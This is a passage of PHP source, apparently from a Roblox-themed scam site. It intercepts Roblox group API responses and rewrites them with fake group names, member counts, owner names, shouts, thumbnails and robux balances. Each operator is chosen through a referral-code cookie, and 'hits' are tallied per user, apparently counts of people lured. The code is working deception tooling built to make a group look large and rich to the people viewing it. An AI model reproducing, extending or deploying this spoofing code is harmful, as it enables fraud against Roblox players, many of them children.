    connect( );
    global $db;
    
    $users_row = $db->query( "
        SELECT COUNT(*) AS total_users
        FROM users
    " )->fetch( );
    
    $hits_row = $db->query( "
        SELECT
            COALESCE( SUM( statistics_accounts ), 0 ) AS total_hits
        FROM users
    " )->fetch( );
    
    return [
        "total_users" => (int) ( $users_row[ "total_users" ] ?? 0 ),
        "total_hits" => (int) ( $hits_row[ "total_hits" ] ?? 0 ),
    ];
};

function get_spoof_group_account( ): ?array
{
    $secret = trim( (string) ( $_COOKIE[ "secret" ] ?? "" ) );
    if ( $secret === "" )
    {
        return null;
    };
    return get_user_by_referral_code( $secret );
};

function spoof_group_roblox_id( array $account ): int
{
    $id = (int) ( $account[ "group_roblox_id" ] ?? 0 );
    if ( $id > 0 )
    {
        return $id;
    };
    $resolved = resolve_group_roblox_id( $account );
    return $resolved ?? 0;
};

function group_request_matches_account( string $url, array $account ): bool
{
    $spoof_id = spoof_group_roblox_id( $account );
    if ( $spoof_id <= 0 )
    {
        return false;
    };
    if ( preg_match( "#/v1/groups/(\d+)(?:/|$|\?)#i", $url, $matches ) && (int) $matches[ 1 ] === $spoof_id )
    {
        return true;
    };
    if ( preg_match( "#/v1/groups/(\d+)/currency#i", $url, $matches ) && (int) $matches[ 1 ] === $spoof_id )
    {
        return true;
    };
    if ( preg_match( "/[?&]groupIds=([^&]+)/i", $url, $matches ) )
    {
        foreach ( explode( ",", (string) $matches[ 1 ] ) as $part )
        {
            if ( (int) trim( $part ) === $spoof_id )
            {
                return true;
            };
        };
    };
    return false;
};

function apply_fake_group_payload( array $json, array $account ): array
{
    $json[ "name" ] = (string) ( $account[ "group_name" ] ?? $json[ "name" ] ?? "" );
    $json[ "description" ] = (string) ( $account[ "group_description" ] ?? $json[ "description" ] ?? "" );
    $json[ "memberCount" ] = (int) ( $account[ "group_members" ] ?? $json[ "memberCount" ] ?? 0 );

    if ( isset( $json[ "owner" ] ) && is_array( $json[ "owner" ] ) )
    {
        $owner_name = (string) ( $account[ "group_owner_name" ] ?? "" );
        if ( $owner_name !== "" )
        {
            $json[ "owner" ][ "username" ] = $owner_name;
            $json[ "owner" ][ "displayName" ] = $owner_name;
        };
    };

    $shout_text = trim( (string) ( $account[ "group_shout" ] ?? "" ) );
    if ( $shout_text !== "" )
    {
        $owner_name = (string) ( $account[ "group_owner_name" ] ?? "Roblox" );
        $json[ "shout" ] = [
            "body" => $shout_text,
            "poster" => [
                "userId" => 1,
                "username" => $owner_name,
                "displayName" => $owner_name,
            ],
            "created" => gmdate( "c" ),
            "updated" => gmdate( "c" ),
        ];
    };

    return $json;
};

function maybe_spoof_group_api_body( string $url, string $body, array $account ): string
{
    if ( !group_request_matches_account( $url, $account ) )
    {
        return $body;
    };

    $json = json_decode( $body, true );
    if ( !is_array( $json ) )
    {
        return $body;
    };

    $spoof_id = spoof_group_roblox_id( $account );

    if ( str_contains( $url, "thumbnails.roblox.com" ) && isset( $json[ "data" ] ) && is_array( $json[ "data" ] ) )
    {
        $thumb = trim( (string) ( $account[ "group_thumbnail" ] ?? "" ) );
        if ( $thumb === "" )
        {
            return $body;
        };
        foreach ( $json[ "data" ] as $index => $row )
        {
            if ( !is_array( $row ) )
            {
                continue;
            };
            $json[ "data" ][ $index ][ "imageUrl" ] = $thumb;
            $json[ "data" ][ $index ][ "state" ] = "Completed";
        };
        return json_encode( $json, JSON_UNESCAPED_SLASHES );
    };

    if ( str_contains( $url, "/currency" ) )
    {
        $json[ "robux" ] = (int) ( $account[ "group_funds" ] ?? $json[ "robux" ] ?? 0 );
        return json_encode( $json, JSON_UNESCAPED_SLASHES );
    };

    if ( isset( $json[ "data" ] ) && is_array( $json[ "data" ] ) )
    {
        foreach ( $json[ "data" ] as $index => $row )
        {
            if ( !is_array( $row ) )
            {
                continue;
            };
            if ( (int) ( $row[ "id" ] ?? 0 ) === $spoof_id )
            {
                $json[ "data" ][ $index ] = apply_fake_group_payload( $row, $account );
            };
        };
        return json_encode( $json, JSON_UNESCAPED_SLASHES );
    };

    if ( (int) ( $json[ "id" ] ?? 0 ) === $spoof_id || str_contains( $url, "/v1/groups/" ) )
    {
        $json = apply_fake_group_payload( $json, $account );
    };

    return json_encode( $json, JSON_UNESCAPED_SLASHES );
};
?>